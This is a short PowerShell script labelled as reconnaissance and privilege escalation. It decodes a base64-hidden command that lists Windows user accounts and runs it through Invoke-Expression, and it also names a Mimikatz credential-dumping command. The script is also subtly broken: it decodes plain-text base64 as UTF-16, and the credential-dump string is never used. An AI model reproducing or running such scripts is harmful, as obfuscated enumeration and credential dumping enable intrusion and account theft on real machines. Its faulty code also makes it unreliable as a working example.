# Advanced reconnaissance and privilege escalation script
$encoded = 'Get-WmiObject Win32_UserAccount; Invoke-Mimikatz -DumpCreds'
$bytes = [System.Convert]::FromBase64String('R2V0LVdtaU9iamVjdCBXaW4zMl9Vc2VyQWNjb3VudA==')
$cmd = [System.Text.Encoding]::Unicode.GetString($bytes)
Invoke-Expression $cmd